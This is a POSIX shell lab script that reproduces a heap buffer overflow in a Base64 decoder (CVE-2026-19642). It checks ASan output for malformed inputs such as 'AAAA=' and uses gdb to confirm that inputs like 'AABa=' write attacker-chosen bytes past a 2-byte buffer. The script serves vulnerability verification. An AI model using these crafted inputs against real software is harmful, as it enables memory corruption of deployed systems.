#!/bin/sh
# Replay the CVE-2026-19642 lab checks from pinned, offline sources.
set -u
ROOT=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$ROOT"
mkdir -p evidence runs work

PASS=0
FAIL=0
check() {
    name=$1
    file=$2
    shift 2
    if grep -q -- "$1" "$file"; then
        PASS=$((PASS + 1)); echo "PASS $name"
    else
        FAIL=$((FAIL + 1)); echo "FAIL $name"
    fi
}
check_absent() {
    name=$1
    file=$2
    shift 2
    if grep -q -- "$1" "$file"; then
        FAIL=$((FAIL + 1)); echo "FAIL $name"
    else
        PASS=$((PASS + 1)); echo "PASS $name"
    fi
}
run() {
    label=$1
    shift
    "$@" > "evidence/$label.out" 2>&1
    echo "$?" > "evidence/$label.rc"
}

echo PIN_CHECK
sha256sum -c SHA256SUMS > runs/pins.out 2>&1 || { cat runs/pins.out; exit 2; }
echo "PINS_OK $(grep -c ': OK$' runs/pins.out)"

sh build-real.sh > runs/build.out 2>&1 || { tail -30 runs/build.out; exit 3; }
check BUILD_DEBUG runs/build.out 'BUILD_OK decode-debug-asan'
check BUILD_ASAN runs/build.out 'BUILD_OK decode-asan'
check BUILD_PLAIN runs/build.out 'BUILD_OK decode-plain'

run debug-asan-aaaaeq ./work/decode-debug-asan 'AAAA='
check D_ASSERT evidence/debug-asan-aaaaeq.out 'index < m_length'
check_absent D_NO_ASAN evidence/debug-asan-aaaaeq.out 'AddressSanitizer'

run asan-aaaaeq ./work/decode-asan 'AAAA='
check A_OVERFLOW evidence/asan-aaaaeq.out 'heap-buffer-overflow'
check A_WRITE evidence/asan-aaaaeq.out 'WRITE of size 1'
check A_ALLOC evidence/asan-aaaaeq.out '2-byte region'
check A_SINK evidence/asan-aaaaeq.out 'Base64.cpp:115'

run asan-safe-aaaa ./work/decode-asan 'AAAA'
check S_SAFE evidence/asan-safe-aaaa.out 'len=4 calculated=3 actual=3'
check_absent S_SAFE_CLEAN evidence/asan-safe-aaaa.out 'AddressSanitizer'

run asan-safe-9 ./work/decode-asan 'AAAAAAAAA'
check S_SAFE9 evidence/asan-safe-9.out 'len=9 calculated=6 actual=6'
check_absent S_SAFE9_CLEAN evidence/asan-safe-9.out 'AddressSanitizer'

for pair in '5a:AABa=' 'da:AADa='; do
    want=${pair%%:*}
    input=${pair#*:}
    label="gdb-chosen-$want"
    gdb -q -batch -ex 'break Base64.cpp:120' -ex "run $input" \
        -ex 'p buffer.m_length' -ex 'x/4bx *(void**)&buffer.m_data' \
        --args ./work/decode-plain "$input" > "evidence/$label.out" 2>&1
    check "GDB_LEN_$want" "evidence/$label.out" '$1 = 2'
    check "GDB_BYTE_$want" "evidence/$label.out" "0x$want"
done

printf 'RUN_ALL_OK %s PASS / %s FAIL\n' "$PASS" "$FAIL" | tee runs/summary.txt
sha256sum runs/summary.txt | tee runs/summary.sha256
[ "$FAIL" -eq 0 ]
